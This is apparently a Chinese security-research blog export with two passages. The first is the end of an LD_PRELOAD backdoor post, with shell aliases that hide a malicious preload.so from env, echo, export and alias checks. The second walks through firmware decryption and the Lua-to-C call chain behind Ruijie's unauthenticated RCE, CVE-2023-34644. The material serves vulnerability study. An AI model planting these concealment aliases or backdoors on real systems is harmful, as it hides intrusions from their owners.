<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=/home/zikh/Desktop/preload.so</span><br><span class="line">alias echo=&#x27;func()&#123; echo $* | sed &quot;s!/home/zikh/Desktop/preload.so! !g&quot;;&#125;;func&#x27;</span><br><span class="line">alias env=&#x27;func()&#123; env $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br><span class="line">alias set=&#x27;func()&#123; set $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br><span class="line">alias export=&#x27;func()&#123; export $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br><span class="line">alias unalias=&#x27;func() &#123; if [ $# -ne 0 ]; then if [[ $* != &quot;echo&quot; &amp;&amp; $* != &quot;env&quot; &amp;&amp; $* != &quot;set&quot; &amp;&amp; $* != &quot;export&quot; &amp;&amp; $* != &quot;alias&quot; &amp;&amp; $* != &quot;unalias&quot; ]]; then unalias $*; else echo &quot;unalias: no such hash table element: $&#123;*&#125;&quot;; fi; else echo &quot;unalias: not enough arguments&quot;; fi &#125;; func&#x27;</span><br><span class="line">alias alias=&#x27;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v preload.so;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>

<p>将其执行后，调用 <code>whoami</code> 可以看到下图中已经触发了后门，并且用各种方法检查环境变量 <code>LD_PRELOAD</code> 发现一切正常，如下图</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271900896.png" alt="image-20230927190012341"></p>
<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://cloud.tencent.com/developer/article/1683272">https://cloud.tencent.com/developer/article/1683272</a></p>
<p><a href="https://blog.csdn.net/Rong_Toa/article/details/108474167">https://blog.csdn.net/Rong_Toa/article/details/108474167</a></p>
<p><a href="https://www.baeldung.com/linux/ld_preload-trick-what-is">https://www.baeldung.com/linux/ld_preload-trick-what-is</a></p>
<p><a href="https://www.yuque.com/cyberangel/rg9gdm/gg3r9m#MDRY6">https://www.yuque.com/cyberangel/rg9gdm/gg3r9m#MDRY6</a></p>
<p><a href="https://blog.csdn.net/llm_hao/article/details/115493516">https://blog.csdn.net/llm_hao/article/details/115493516</a></p>
<p><a href="https://www.cnblogs.com/net66/p/5609026.html">https://www.cnblogs.com/net66/p/5609026.html</a></p>
]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Linux后门</tag>
        <tag>环境变量</tag>
      </tags>
  </entry>
  <entry>
    <title>站在巨人肩膀上复现CVE-2023-34644</title>
    <url>/posts/e5651b4f.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>winmt</strong> 师傅之前挖到了一个锐捷的未授权 <code>RCE</code> 漏洞，影响了该厂商下的众多路由器、交换机、中继器等设备。<strong>winmt</strong> 师傅已经发布了 <a href="https://bbs.kanxue.com/thread-277386.htm">相关的挖掘经历</a>，对仿真的搭建和漏洞分析已经写的比较详细。本篇文章主要是自己对该漏洞调用链进行一个完整的梳理，以及在 <strong>winmt</strong> 师傅文章中未提到的部分我会进行记录。<span id="more"></span>特别感谢 <strong>winmt</strong> 师傅在我复现期间多次解答我的各种困惑</p>
<p>本文分析的固件为 <code>EW_3.0(1)B11P204_EW1200GI</code>（已解密） 百度网盘链接：<a href="https://pan.baidu.com/s/1RutoNCTiGBiW74YpzKXfxg?pwd=vht7">https://pan.baidu.com/s/1RutoNCTiGBiW74YpzKXfxg?pwd=vht7</a>    提取码：vht7</p>
<h2 id="固件解密"><a href="#固件解密" class="headerlink" title="固件解密"></a>固件解密</h2><p>上面已经提供了解密后的固件，但目前从锐捷官网下载的固件都是被加密的。此处记录一下解密的三种思路</p>
<ol>
<li>寻找过渡版本的固件，如果一个路由器型号最初版本为 <code>x001</code> 此时并没有加密 ，然后在 <code>x005</code> 版本开始对固件进行加密了。那么 <code>x004</code> 就是过渡版本的固件，为了从 <code>x004</code> 升级到 <code>x005</code> 固件，一定会在 <code>x004</code> 的文件系统里存放 <code>x005</code> 固件的解密脚本，不然路由器就无法解开 <code>x005</code> 的固件进行升级了，如果能从官网上下载到过渡版本的固件，去寻找其中的解密程序，编写一个解密脚本即可（不过就锐捷的固件而言，我并没有在官网上找到过渡版本的固件，疑似被下架了）</li>
<li>购买真机，直接从芯片中提取文件系统（目前未尝试过）</li>
<li>对加密后的固件直接分析，寻找一些特征或有规律的字节码，尝试编写其解密脚本</li>
</ol>
<p>下面对第三种思路，进行详细介绍</p>
<p>以 <code>EW_3.0(1)B11P219_EW1200I_10200109_install_encypto.bin</code> 固件为例（官网上可以直接下载，不再提供链接）</p>
<p>直接用 <code>binwalk</code> 解压是失败的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121128678.png" alt="image-20230912112845555"></p>
<p>用 <code>010 Editor</code> 打开，查看文件的末尾发现存在大量重复的字节码 <code>0x80</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121127424.png" alt="image-20230912112712262"></p>
<p><strong>winmt</strong> 师傅给我说通常文件末尾会填充大量的 <code>\xff</code> 或者 <code>\x00</code> 字节码，这里有大量的重复字节码 <code>0x80</code> ，猜测可能是单字节异或 <code>key</code> 得到的。尝试拿 <code>0xff</code> 与 <code>0x80</code> 进行异或，得到疑似 <code>key</code> 值 <code>0x7f</code> </p>
<p>用下面的脚本，读取加密固件的字节码，逐字节与 <code>0x7f</code> 进行异或，得到一个新的文件</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jiemi</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">                byte = infile.read(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">while</span> byte:</span><br><span class="line">                    byte_value = <span class="built_in">ord</span>(byte)</span><br><span class="line">                    xor_result = byte_value ^ <span class="number">0x7f</span></span><br><span class="line">                    outfile.write(<span class="built_in">bytes</span>([xor_result]))</span><br><span class="line">                    byte = infile.read(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;File <span class="subst">&#123;input_file&#125;</span> successfully decrypted to <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python exp.py input_file output_file&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        input_filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">        output_filename = sys.argv[<span class="number">2</span>]</span><br><span class="line">        jiemi(input_filename, output_filename)</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121145573.png" alt="image-20230912114545222"></p>
<p>可以看到 <code>binwalk</code> 成功识别了固件，并成功解压出文件系统</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309121146061.png" alt="image-20230912114656903"></p>
<p>拿到文件系统后，可以去寻找负责加解密的程序 <code>/usr/sbin/rg-upgrade-crypto</code> ，对二进制文件 <code>/usr/sbin/rg-upgrade-crypto</code> 进行分析可以写出解密脚本，下面是 <strong>winmt</strong> 师傅编写的解密脚本</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> <span class="type">uint8_t</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTE(x, n) (*((uint8_t *)&amp;(x)+n))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_msg</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> num1 = <span class="number">1</span>, num2 = <span class="number">0x10001</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint8_t</span> *enc_buf, <span class="type">uint8_t</span> *dec_buf, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> sum = (<span class="type">uint8_t</span>)num1 + (<span class="type">uint8_t</span>)num2 + BYTE(num2, <span class="number">1</span>) + BYTE(num2, <span class="number">2</span>);</span><br><span class="line">		BYTE(num2, <span class="keyword">sizeof</span>(num2)/<span class="keyword">sizeof</span>(<span class="type">uint8_t</span>)<span class="number">-1</span>) = sum % <span class="number">2</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)</span><br><span class="line">			*((<span class="type">uint8_t</span> *)&amp;num1 + j) = *((<span class="type">uint8_t</span> *)&amp;num1 + j + <span class="number">1</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="type">uint8_t</span> key = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; k++)</span><br><span class="line">			key |= *((<span class="type">uint8_t</span> *)&amp;num1 + k) &lt;&lt; k;</span><br><span class="line">		*(<span class="type">uint8_t</span> *)(dec_buf + i) = *(<span class="type">uint8_t</span> *)(enc_buf + i) ^ key;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) error_msg(<span class="string">&quot;Usage: ./rg-decrypt [encrypted_firmware_path]&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> *enc_path = strdup(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="type">char</span> *dec_path = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(dec_path, argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">strcat</span>(dec_path, <span class="string">&quot;.decrypted&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_buf</span>;</span></span><br><span class="line">	<span class="type">int</span> stat_fd = stat(enc_path, &amp;stat_buf);</span><br><span class="line">	<span class="keyword">if</span> (stat_fd &lt; <span class="number">0</span>) error_msg(<span class="string">&quot;The encrypted firmware does not exist !&quot;</span>);</span><br><span class="line">	<span class="type">int</span> size = stat_buf.st_size;</span><br><span class="line">	</span><br><span class="line">	<span class="type">uint8_t</span> *enc_buf = (<span class="type">uint8_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="type">uint8_t</span> *dec_buf = (<span class="type">uint8_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> enc_fd = open(enc_path, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span> (enc_fd &lt; <span class="number">0</span>) error_msg(<span class="string">&quot;Error to open the encrypted firmware !&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> dec_fd = open(dec_path, O_WRONLY | O_CREAT, S_IREAD | S_IWRITE | S_IRGRP);</span><br><span class="line">	<span class="keyword">if</span> (dec_fd &lt; <span class="number">0</span>) error_msg(<span class="string">&quot;Error to create the decrypted firmware !&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (read(enc_fd, enc_buf, <span class="number">22</span>) != <span class="number">22</span>) error_msg(<span class="string">&quot;Error to read from the encrypted firmware !&quot;</span>);</span><br><span class="line">	size -= <span class="number">22</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(size &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> len = size;</span><br><span class="line">		<span class="keyword">if</span> (size &gt; <span class="number">0x1000</span>) len = <span class="number">0x1000</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="built_in">memset</span>(enc_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(enc_buf));</span><br><span class="line">		<span class="built_in">memset</span>(dec_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(dec_buf));</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (read(enc_fd, enc_buf, len) != len) error_msg(<span class="string">&quot;Error to read from the encrypted firmware !&quot;</span>);</span><br><span class="line">		decrypt(enc_buf, dec_buf, len);</span><br><span class="line">		<span class="keyword">if</span> (write(dec_fd, dec_buf, len) != len) error_msg(<span class="string">&quot;Error to write into the decrypted firmware !&quot;</span>);</span><br><span class="line">		size -= len;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(enc_buf);</span><br><span class="line">	<span class="built_in">free</span>(dec_buf);</span><br><span class="line">	close(enc_fd);</span><br><span class="line">	close(dec_fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果仔细研究下解密脚本能够发现，固件异或的 <code>key</code> 并不是一直为 <code>0x7f</code> ，在最初的几轮异或中 <code>key</code> 是在变化的，<code>key</code> 经过几轮迭代后才变成了固定的 <code>0x7f</code> ，好在没有影响到后面的文件系统的完整性。</p>
<h2 id="lua文件的调用链分析"><a href="#lua文件的调用链分析" class="headerlink" title="lua文件的调用链分析"></a>lua文件的调用链分析</h2><p>在 <code>/usr/lib/</code> 路径下存在一个 <code>lua</code> 目录，其中存放了很多 <code>lua</code> 文件。主要作用是对前端传入的数据做了一些简单处理和判断，然后将数据传递给二进制文件进一步处理</p>
<p> <code>/usr/lib/lua/luci/controller/eweb/api.lua</code> 文件中，配置了路由 <code>entry(&#123;&quot;api&quot;, &quot;auth&quot;&#125;, call(&quot;rpc_auth&quot;), nil).sysauth = false</code></p>
<p>这意味着当用户访问 <code>/api/auth</code> 路径时，将调用 <code>rpc_auth</code> 函数。在 <code>luci</code> 框架中 <code>sysauth</code> 属性控制是否需要系统级的用户认证才能访问该路由，这里的 <code>sysauth</code> 属性为 <code>false</code> ，表示无需进行系统认证即可访问。</p>
<p><code>rpc_auth</code> 函数首先引入了一些模块（代码如下），然后获取 <code>HTTP_CONTENT_LENGTH</code> 的长度是否大于 <code>1000</code> 字节，如果不大于的话会将准备 <code>HTTP</code> 响应的类型设置为 <code>application/json</code> ，下面的 <code>handle</code> 函数第一个参数 <code>_tbl</code> 传入的是 <code>luci.modules.noauth</code> 文件返回的内容，变量类型为 <code>table</code> （该 <code>table</code> 包含了 <code>noauth</code> 文件中定义的四个函数 <code>login</code> <code>singleLogin</code> <code>merge</code> <code>checkNet</code>）</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tonumber</span>(http.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_CONTENT_LENGTH&quot;</span>) <span class="keyword">or</span> <span class="number">0</span>) &gt; <span class="number">1000</span> <span class="keyword">then</span></span><br><span class="line">        http.prepare_content(<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="comment">-- http.write(&#123;code = &quot;1&quot;, err = &quot;too long data&quot;&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;too long data&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>下面分析 <code>luci.utils.jsonrpc</code> 文件中的 <code>handle</code> 函数，它主要是把参数 <code>tbl</code> 以及报文中的 <code>method</code> 字段传入给了 <code>resolve</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>resolve</code> 函数的作用跟它的名字一样，来解析出 <code>method</code> 字段对应的函数（报文中写成 <code>&quot;method&quot;: &quot;merge&quot;</code> 具体的原因 <strong>winmt</strong> 师傅<a href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h3_1">文章</a> 中写的很清楚），通过遍历 <code>mod</code> （表中存储了四种方法），然后通过 <code>rawget</code>  获取表中键为 <code>path[j]</code> （也就是 <code>merge</code> ）的值并赋值给 <code>mod</code> ，此时 <code>mod</code> 就表示 <code>noauth.lua</code> 文件中的 <code>merge</code> 函数 </p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">(mod, method)</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">path</span> = luci.util.split(method, <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j = <span class="number">1</span>, #<span class="built_in">path</span> - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">mod</span> = <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[j])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">mod</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">mod</span> = <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[#<span class="built_in">path</span>]) <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;function&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mod</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>发现代码 <code>proxy(method, json.params or &#123;&#125;)</code> ，这表示 <code>merge</code> 函数作为参数传入给了 <code>proxy</code> 中，这里的 <code>method</code> 又传入了 <code>luci.util</code> 文件中的 <code>copcall</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy</span><span class="params">(method, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> res = &#123;luci.util.copcall(method, ...)&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>copcall</code> 函数主要是对 <code>coxpcall</code> 的一个封装</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copcall</span><span class="params">(f, ...)</span></span></span><br><span class="line">	<span class="keyword">return</span> coxpcall(f, copcall_id, ...)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>终于在 <code>coxpcall</code> 函数内部发现调用了 <code>f</code> ，<code>oldpcall(coroutine.create, f)</code> 这行代码的目的是在一个新的协程中运行函数 <code>f</code> ，因此执行到这里 <code>merge</code> 函数被触发</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">coxpcall</span><span class="params">(f, err, ...)</span></span></span><br><span class="line">	<span class="keyword">local</span> res, co = oldpcall(<span class="built_in">coroutine</span>.<span class="built_in">create</span>, f)</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>下面开始分析 <code>merge</code> 函数（本篇文章只能算是对 <strong>winmt</strong> 师傅写的文章进行一个补充，这里不介绍为什么是调用 <code>merge</code> 函数而不是调用其他函数，就是因为在 <strong>winmt</strong> 师傅写的 <a href="https://bbs.kanxue.com/thread-277386.htm">文章</a> 中已经对这部分进行了详细的介绍），该函数的内部调用了 <code>luci.modules.cmd</code> 文件中的 <code>devSta.set</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>这个 <code>devSta.set</code> 函数的定义如下，先是调用了 <code>doParams</code> 函数对 <code>json</code> 数据进行解析，随后调用了 <code>fetch</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    params.method = opt[i]</span><br><span class="line">    params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">    <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>这个 <code>fetch</code> 函数在 <code>cmd.lua</code> 文件中已经定义了，这里调用了 <code>fn</code> 也就是 <code>fetch</code> 函数传入进来的 <code>model.fetch</code></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(fn, shell, params, ...)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _start = <span class="built_in">os</span>.<span class="built_in">time</span>()</span><br><span class="line">    <span class="keyword">local</span> _res = fn(...)</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p> <code>model</code> 是 <code>dev_sta</code> 文件的返回结果，因此 <code>model.fetch</code> 实际上是 <code>dev_sta</code> 文件中的 <code>fetch</code> 函数，该函数定义如下，能够看到最后是调用了 <code>/usr/lib/lua/libuflua.so</code> 文件中的 <code>client_call</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(cmd, module, param, back, ip, password, force, not_change_configId, multi)</span></span></span><br><span class="line">    <span class="keyword">local</span> uf_call = <span class="built_in">require</span> <span class="string">&quot;libuflua&quot;</span></span><br><span class="line">......</span><br><span class="line">    <span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br><span class="line">    <span class="keyword">return</span> stat</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>用 <code>IDA</code> 打开 <code>/usr/lib/lua/libuflua.so</code> 文件，并没有看到定义的 <code>client_call</code> 函数，不过发现了 <code>uf_client_call</code> 函数，猜测是程序内部进行了关联。<code>shift+f12</code> 搜索字符串发现并没有看到字符串 <code>client_call</code> （如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513243.png" alt="image-20230822105021327"></p>
<p>大概率说明 <code>IDA</code> 没有把 <code>client_call</code> 解析成字符串，而是解析成了代码。我这里用 <code>010Editor</code> 打开该文件进行搜索字符串 <code>client_call</code>，成功搜索到后发现其地址位于 <code>0xff0</code> 处</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513988.png" alt="image-20230822105722385" style="zoom:67%;" />



<p>可以看到 <code>IDA</code> 确实是将 <code>0xff0</code> 位置的数据当做了代码来解析，选中这部分数据，按 <code>a</code> ，就能以字符串的形式呈现了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513739.png" alt="image-20230822105929868"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513124.png" alt="image-20230822110053012"></p>
<p>对字符串 <code>client_call</code> 进行交叉引用，发现最终调用位置如下，<code>luaL_register</code> 是 <code>Lua</code> 中注册 <code>C</code> 语言编写的函数，它作用是将 <code>C</code> 函数添加到一个 <code>Lua</code> 模块中，使得这些 <code>C</code> 函数能够从 <code>Lua</code> 代码中被调用</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513757.png" alt="image-20230822111240902"></p>
<p>该函数的原型如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">luaL_register</span> <span class="params">(lua_State *L, <span class="type">const</span> <span class="type">char</span> *libname, <span class="type">const</span> luaL_Reg *l)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>lua_State *L</code>：<code>Lua</code> 状态指针，代表了一个 <code>Lua</code> 解释器实例。</li>
<li><code>const char *libname</code>：模块的名称，这个名称会在 <code>Lua</code> 中作为一个全局变量存在，存放模块的函数。</li>
<li><code>const luaL_Reg *l</code>：一个结构体数组，包含要注册到模块中的函数的信息。每个结构体包含函数的名称和相应的 <code>C</code> 函数指针</li>
</ul>
<p>这里重点关注第三个参数，这就说明 <code>0x1101C</code> 的位置存放的是一个字符串以及一个函数指针（如下图），因此判断出 <code>client_call</code> 实际就定义在了 <code>sub_A00</code> 中</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513875.png" alt="image-20230822111950548"></p>
